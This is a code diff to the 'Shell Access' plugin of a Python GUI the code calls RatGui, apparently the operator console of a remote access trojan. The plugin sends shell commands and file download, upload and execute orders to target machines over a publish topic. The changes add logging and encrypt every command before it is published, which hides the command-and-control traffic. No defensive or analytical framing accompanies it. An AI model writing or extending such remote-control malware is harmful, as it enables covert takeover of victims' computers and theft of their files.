@@ -6,10 +6,17 @@ from .base_plugin import BasePlugin
 import ujson as json
 import os
 import base64
+import logging
+
+# Configure logging
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
 class ShellAccessDialog(QDialog):
-    def __init__(self, parent=None, target="all", current_dir="", client=None, topic="/commands/"):
-        super().__init__(parent)
+    def __init__(self, gui, target="all", current_dir="", client=None, topic="/commands/"):
+        super().__init__(gui)
+        logger.info("Initializing ShellAccessDialog")
+        self.gui = gui  # Store the RatGui instance directly
         self.client = client
         self.topic = topic
         self.target = target
@@ -95,7 +102,9 @@ class ShellAccessDialog(QDialog):
             # Track the last action for cd detection
             self.last_action = command_text if command else "manual_command"
             cmd = {'type': 'command', 'target': self.target, 'action': 'shell', 'command': command_text}
-            self.client.publish(self.topic, json.dumps(cmd))
+            cmd_json = json.dumps(cmd)
+            encrypted_cmd = self.gui.encrypt_message(cmd_json)  # Use self.gui instead of self.parent
+            self.client.publish(self.topic, encrypted_cmd)
             print(f"ShellAccessDialog sent command: {cmd}")
         if not command:  # If called from execute button, clear input
             self.command_input.setText(f"{self.current_dir}: > ")
@@ -172,7 +181,9 @@ class ShellAccessDialog(QDialog):
             'action': 'download',
             'file': file_name
         }
-        self.client.publish(self.topic, json.dumps(cmd))
+        cmd_json = json.dumps(cmd)
+        encrypted_cmd = self.gui.encrypt_message(cmd_json)  # Use self.gui
+        self.client.publish(self.topic, encrypted_cmd)
         print(f"ShellAccessDialog sent download command for file: {file_name}")
 
     def upload_file(self):
@@ -191,7 +202,9 @@ class ShellAccessDialog(QDialog):
                     'file': file_name,
                     'data': encoded_data
                 }
-                self.client.publish(self.topic, json.dumps(cmd))
+                cmd_json = json.dumps(cmd)
+                encrypted_cmd = self.gui.encrypt_message(cmd_json)  # Use self.gui
+                self.client.publish(self.topic, encrypted_cmd)
                 print(f"ShellAccessDialog sent upload command for file: {file_name}")
             except Exception as e:
                 print(f"Error uploading file: {e}")
@@ -204,7 +217,9 @@ class ShellAccessDialog(QDialog):
             'action': 'execute',
             'file': file_name
         }
-        self.client.publish(self.topic, json.dumps(cmd))
+        cmd_json = json.dumps(cmd)
+        encrypted_cmd = self.gui.encrypt_message(cmd_json)  # Use self.gui
+        self.client.publish(self.topic, encrypted_cmd)
         print(f"ShellAccessDialog sent execute command for file: {file_name}")
 
     def handle_download_response(self, data):
@@ -235,18 +250,25 @@ class ShellAccessDialog(QDialog):
 class ShellAccessPlugin(BasePlugin):
     def __init__(self, parent):
         super().__init__(parent)
+        logger.info("Initializing ShellAccessPlugin")
         self.name = "Shell Access"
         self.menu_action = self.name
         self.priority = 40
         self.dialogs = {}
         self.current_dirs = {}
+        logger.info(f"ShellAccessPlugin initialized with name: {self.name}, menu_action: {self.menu_action}")
 
     def execute(self, target):
+        logger.info(f"Executing ShellAccessPlugin for target: {target}")
         current_dir = self.current_dirs.get(target, "")
         dialog = ShellAccessDialog(self.parent, target, current_dir, client=self.parent.client, topic=self.parent.topic)
         self.dialogs[target] = dialog
         dialog.exec()
         del self.dialogs[target]
+
+    def get_menu_action(self):
+        logger.info(f"ShellAccessPlugin get_menu_action returning: {self.menu_action}")
+        return self.menu_action
 
     def handle_response(self, data):
         if data.get('type') == 'shell_response':
